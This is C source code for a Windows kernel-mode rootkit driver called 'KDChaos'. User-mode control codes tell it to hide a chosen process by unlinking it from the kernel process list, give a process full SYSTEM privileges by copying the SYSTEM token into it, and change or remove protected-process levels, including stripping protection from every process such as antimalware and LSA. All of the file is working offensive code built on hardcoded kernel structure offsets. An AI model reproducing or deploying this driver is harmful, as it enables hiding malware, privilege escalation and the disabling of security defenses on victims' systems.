#include <ntifs.h>
#include <ntdef.h>
#include <minwindef.h>
#include <ntstrsafe.h>
#include <wdm.h>

#define HIDE_PROC CTL_CODE(FILE_DEVICE_UNKNOWN,0x45,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PRIVILEGE_ELEVATION CTL_CODE(FILE_DEVICE_UNKNOWN,0x90,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_SYSTEM CTL_CODE(FILE_DEVICE_UNKNOWN,0x91,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_WINTCB CTL_CODE(FILE_DEVICE_UNKNOWN,0x92,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_WINDOWS CTL_CODE(FILE_DEVICE_UNKNOWN,0x93,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_AUTHENTICODE CTL_CODE(FILE_DEVICE_UNKNOWN,0x94,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_WINTCB_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x95,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_WINDOWS_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x96,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_LSA_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x97,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_ANTIMALWARE_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x98,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_AUTHENTICODE_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x99,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define UNPROTECT_ALL_PROCESSES CTL_CODE(FILE_DEVICE_UNKNOWN,0x100,METHOD_BUFFERED ,FILE_ANY_ACCESS)


UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\KDChaos");

UNICODE_STRING SymbName = RTL_CONSTANT_STRING(L"\\??\\KDChaos");

char* PsGetProcessImageFileName(PEPROCESS Process);

EX_PUSH_LOCK pLock;


typedef struct protection_levels {
    BYTE PS_PROTECTED_SYSTEM;
    BYTE PS_PROTECTED_WINTCB;
    BYTE PS_PROTECTED_WINDOWS;
    BYTE PS_PROTECTED_AUTHENTICODE;
    BYTE PS_PROTECTED_WINTCB_LIGHT;
    BYTE PS_PROTECTED_WINDOWS_LIGHT;
    BYTE PS_PROTECTED_LSA_LIGHT;
    BYTE PS_PROTECTED_ANTIMALWARE_LIGHT;
    BYTE PS_PROTECTED_AUTHENTICODE_LIGHT;
}protection_level, *Pprotection_levels;

protection_level global_protection_levels = {
    .PS_PROTECTED_SYSTEM = 0x72,
    .PS_PROTECTED_WINTCB = 0x62,
    .PS_PROTECTED_WINDOWS = 0x52,
    .PS_PROTECTED_AUTHENTICODE = 0x12,
    .PS_PROTECTED_WINTCB_LIGHT = 0x61,
    .PS_PROTECTED_WINDOWS_LIGHT = 0x51,
    .PS_PROTECTED_LSA_LIGHT = 0x41,
    .PS_PROTECTED_ANTIMALWARE_LIGHT = 0x31,
    .PS_PROTECTED_AUTHENTICODE_LIGHT = 0x11
};

int
UnprotectAllProcesses(
)
{
    PVOID process = NULL;
    PLIST_ENTRY plist;
    __try
    {

        NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)4, (PEPROCESS*)&process);
        if (ret != STATUS_SUCCESS)
        {
            if (ret == STATUS_INVALID_PARAMETER)
            {
                DbgPrint("the process ID was not found.");
            }
            if (ret == STATUS_INVALID_CID)
            {
                DbgPrint("the specified client ID is not valid.");
            }
            return (-1);
        }

        plist = (PLIST_ENTRY)((char*)process + 0x448);

        while (plist->Flink != (PLIST_ENTRY)((char*)process + 0x448))
        {
            DbgPrint("Blink: %p, Flink: %p\n", plist->Blink, plist->Flink);

            ULONG_PTR EProtectionLevel = (ULONG_PTR)plist->Flink - 0x448 + 0x87a;

            *(BYTE*)EProtectionLevel = (BYTE)0;

            plist = plist->Flink;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return (-1);
    }

    ObDereferenceObject(process);
    return (0);
}

int ChangeProtectionLevel(int pid,BYTE protectionOption)
{
    PVOID process = NULL;

    NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)pid, &process);

    if (ret != STATUS_SUCCESS)
    {
        if (ret == STATUS_INVALID_PARAMETER)
        {
            DbgPrint("the process ID was not found.");
        }
        if (ret == STATUS_INVALID_CID)
        {
            DbgPrint("the specified client ID is not valid.");
        }
        return (-1);
    }

    ULONG_PTR EProtectionLevel = (ULONG_PTR)process + 0x87a;

    if (*(BYTE*)EProtectionLevel == protectionOption)
    {
        DbgPrint("Protection Level is already set !!");

        return (0);
    }

    *(BYTE*)EProtectionLevel = protectionOption;

    return (0);
}


int
PrivilegeElevationForProcess(
    int pid
)
{
    PVOID process = NULL;
    PVOID sys = NULL;
    PACCESS_TOKEN TargetToken;
    PACCESS_TOKEN sysToken;

    __try
    {

        NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)pid, &process);

        if (ret != STATUS_SUCCESS)
        {
            if (ret == STATUS_INVALID_PARAMETER)
            {
                DbgPrint("the process ID was not found.");
            }
            if (ret == STATUS_INVALID_CID)
            {
                DbgPrint("the specified client ID is not valid.");
            }
            return (-1);
        }

        ret = PsLookupProcessByProcessId((HANDLE)0x4, &sys); // system handle

        if (ret != STATUS_SUCCESS)
        {
            if (ret == STATUS_INVALID_PARAMETER)
            {
                DbgPrint("system process ID was not found.");
            }
            if (ret == STATUS_INVALID_CID)
            {
                DbgPrint("the system ID is not valid.");
            }

            ObDereferenceObject(process);

            return (-1);
        }
        char* ImageName;

        DbgPrint("target process image name : %s \n", ImageName = PsGetProcessImageFileName((PEPROCESS)process));

        TargetToken = PsReferencePrimaryToken(process);

        if (!TargetToken)
        {
            ObDereferenceObject(sys);
            ObDereferenceObject(process);

            return (-1);
        }

        DbgPrint("%s token : %x\n", ImageName, TargetToken);

        sysToken = PsReferencePrimaryToken(sys);

        if (!sysToken)
        {
            ObDereferenceObject(sys);
            ObDereferenceObject(TargetToken);
            ObDereferenceObject(process);

            return (-1);
        }

        DbgPrint("system token : %x\n", sysToken);

        ULONG_PTR UniqueProcessIdAddress = (ULONG_PTR)process + 0x4b8;

        DbgPrint("%s token address  %x\n", ImageName, UniqueProcessIdAddress);

        unsigned long long  UniqueProcessId = *(PHANDLE)UniqueProcessIdAddress;


        ULONG_PTR sysadd = (ULONG_PTR)sys + 0x4b8;

        DbgPrint("system token address : %x\n", sysadd);


        *(PHANDLE)UniqueProcessIdAddress = *(PHANDLE)sysadd;

        DbgPrint("process %s Token updated to  :%x ", ImageName, *(PHANDLE)(UniqueProcessIdAddress));

        for (int i = 1; i < 8; i++)
        {
            unsigned char f = *(PHANDLE)(UniqueProcessIdAddress + i);
            DbgPrint(" %x ", f);
        }

        DbgPrint("\n");
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return (-1);
    }

    ObDereferenceObject(sys);
    ObDereferenceObject(TargetToken);
    ObDereferenceObject(sysToken);
    ObDereferenceObject(process);

    return (0);
}

int 
HideProcess(
    int pid
)
{

    PVOID process = NULL;

    PLIST_ENTRY plist;
    __try
    {

        NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)pid, (PEPROCESS *)&process);

        if (ret != STATUS_SUCCESS)
        {
            if (ret == STATUS_INVALID_PARAMETER)
            {
                DbgPrint("The process ID was not found.");
            }
            if (ret == STATUS_INVALID_CID)
            {
                DbgPrint("The specified client ID is not valid.");
            }
            return (-1);
        }

        plist = (PLIST_ENTRY)((char *)process + 0x448);

        ExAcquirePushLockExclusive(&pLock);

        if (plist->Flink == NULL || plist->Blink == NULL)
        {
            ExReleasePushLockExclusive(&pLock);
            __leave;
        }

        if (plist->Flink->Blink != plist || plist->Blink->Flink != plist)
        {
            ExReleasePushLockExclusive(&pLock);
            DbgPrint("Error: Inconsistent Flink and Blink pointers.");
            return (-1);
        }

        plist->Flink->Blink = plist->Blink;
        plist->Blink->Flink = plist->Flink;

        plist->Flink = NULL;
        plist->Blink = NULL;

        ExReleasePushLockExclusive(&pLock);

        DbgPrint("Process '%wZ' is now hidden", PsGetProcessImageFileName(process));
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        DbgPrint("An exception occurred while hiding the process.");
        return (-1);
    }

    ObDereferenceObject(process);
    return (0);
}

void
unloadv(
    PDRIVER_OBJECT driverObject
)
{
    IoDeleteSymbolicLink(&SymbName);

    IoDeleteDevice(driverObject->DeviceObject);

    DbgPrint("Driver Unloaded\n");
}


NTSTATUS processIoctlRequest(
    DEVICE_OBJECT* DeviceObject,
    IRP* Irp
)
{
    PIO_STACK_LOCATION  pstack = IoGetCurrentIrpStackLocation(Irp);

    int pstatus = 0;
    int inputInt = 0;

    if (pstack->Parameters.DeviceIoControl.IoControlCode == HIDE_PROC)
    {

        RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));

        pstatus = HideProcess(inputInt);

        DbgPrint("Received input value: %d\n", inputInt);
    }

    if (pstack->Parameters.DeviceIoControl.IoControlCode == PRIVILEGE_ELEVATION)
    {
        RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));

        pstatus = PrivilegeElevationForProcess(inputInt);

        DbgPrint("Received input value: %d\n", inputInt);
    }
    if (pstack->Parameters.DeviceIoControl.IoControlCode == PROTECTION_LEVEL_SYSTEM)
     {
        RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));

        pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_SYSTEM);

        DbgPrint("Process Protection changed to WinSystem");
     }
     if (pstack->Parameters.DeviceIoControl.IoControlCode == PROTECTION_LEVEL_WINTCB)
     {
         RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));

         pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_WINTCB);

         DbgPrint("Process Protection changed to WinTcb");
     }
     if (pstack->Parameters.DeviceIoControl.IoControlCode == PROTECTION_LEVEL_WINDOWS)
     {
         RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));

         pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_WINDOWS);

         DbgPrint("Process Protection changed to Windows");
     }
     if (pstack->Parameters.DeviceIoControl.IoControlCode == PROTECTION_LEVEL_AUTHENTICODE)
     {
         RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));

         pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_AUTHENTICODE);

         DbgPrint("Process Protection changed to Authenticode ");
     }
     if (pstack->Parameters.DeviceIoControl.IoControlCode == PROTECTION_LEVEL_WINTCB_LIGHT)
     {
         RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));

         pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_WINTCB_LIGHT);

         DbgPrint("Process Protection changed to WinTcb ");
     }
     if (pstack->Parameters.DeviceIoControl.IoControlCode == PROTECTION_LEVEL_WINDOWS_LIGHT)
     {
         RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));

         pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_WINDOWS_LIGHT);

         DbgPrint("Process Protection changed to Windows ");
     }
     if (pstack->Parameters.DeviceIoControl.IoControlCode == PROTECTION_LEVEL_LSA_LIGHT)
     {
         RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));

         pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_LSA_LIGHT);

         DbgPrint("Process Protection changed to Lsa");
     }
     if (pstack->Parameters.DeviceIoControl.IoControlCode == PROTECTION_LEVEL_ANTIMALWARE_LIGHT)
     {
         RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));

         pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_ANTIMALWARE_LIGHT);

         DbgPrint("Process Protection changed to Antimalware ");
     }
     if (pstack->Parameters.DeviceIoControl.IoControlCode == PROTECTION_LEVEL_AUTHENTICODE_LIGHT)
     {
         RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));

         pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_AUTHENTICODE_LIGHT);

         DbgPrint("Process Protection changed to Authenticode ");
     }
     if (pstack->Parameters.DeviceIoControl.IoControlCode == UNPROTECT_ALL_PROCESSES)
     {
         pstatus = UnprotectAllProcesses();

         DbgPrint("all Processes Protection has been removed");
     }
    memcpy(Irp->AssociatedIrp.SystemBuffer, &pstatus, sizeof(pstatus));

    Irp->IoStatus.Status = 0;

    Irp->IoStatus.Information = sizeof(int);

    IoCompleteRequest(Irp, IO_NO_INCREMENT);
}

void IRP_MJCreate()
{
    DbgPrint("IRP_CREATED\n");

}

void IRP_MJClose()
{ 
    DbgPrint("IRP_CLOSED");

}

NTSTATUS
DriverEntry(
    PDRIVER_OBJECT driverObject,
    PUNICODE_STRING registryPath
)
{
    DbgPrint("Driver Loaded\n");
    ExInitializePushLock(&pLock);

    UNREFERENCED_PARAMETER(registryPath);
    UNREFERENCED_PARAMETER(driverObject);

    driverObject->DriverUnload = &unloadv;
    driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = processIoctlRequest;
    driverObject->MajorFunction[IRP_MJ_CREATE] = IRP_MJCreate;
    driverObject->MajorFunction[IRP_MJ_CLOSE] = IRP_MJClose;

    IoCreateDevice(driverObject, 0, &DeviceName, FILE_DEVICE_UNKNOWN, METHOD_BUFFERED, FALSE, &driverObject->DeviceObject);
    IoCreateSymbolicLink(&SymbName, &DeviceName);

    return (STATUS_SUCCESS);
}
